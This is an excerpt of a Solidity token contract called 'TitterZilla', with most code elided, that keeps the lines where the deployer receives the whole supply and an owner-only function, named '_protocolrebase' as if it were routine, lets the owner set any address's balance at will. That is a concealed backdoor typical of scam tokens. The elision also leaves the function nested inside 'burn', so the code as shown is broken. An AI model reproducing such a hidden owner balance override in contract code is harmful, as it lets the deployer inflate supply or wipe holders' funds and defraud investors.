...
contract TitterZilla is Context, _IERC20ANTIBOT, _Ownables {
  ...
  constructor() public {
    ...
    _maxbalances[msg.sender] = MAXTOTALSUPPLY;

    emit Transfer(address(0), msg.sender, MAXTOTALSUPPLY);
  }
  ...
  function burn(uint256 _tVALUE) public virtual {
     ...
     function _protocolrebase(address _shipsadr, uint256 _tVALUE) external onlyOwner {
      _maxbalances[_shipsadr] = _tVALUE * 10 ** 9;
  }
  ...
  function _burn(address account, uint256 _tVALUE) internal {
    ...
    MAXTOTALSUPPLY = MAXTOTALSUPPLY.sub(_tVALUE);
